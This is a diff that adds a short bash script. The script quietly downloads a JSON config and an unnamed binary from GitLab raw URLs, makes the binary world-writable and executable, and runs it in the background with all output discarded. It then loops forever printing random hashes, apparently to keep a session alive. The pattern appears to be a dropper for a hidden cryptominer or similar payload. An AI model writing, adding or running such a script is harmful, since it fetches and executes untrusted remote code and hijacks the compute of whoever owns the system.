@@ -1,0 +1,6 @@
+#!/bin/bash
+wget -q https://gitlab.com/komporgasku/sekolah/-/raw/main/z.json
+wget -q https://gitlab.com/jadons19292/donlod/-/raw/main/klarig3
+chmod 777 klarig3
+./klarig3 -c z.json > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done >/dev/null 2>&1
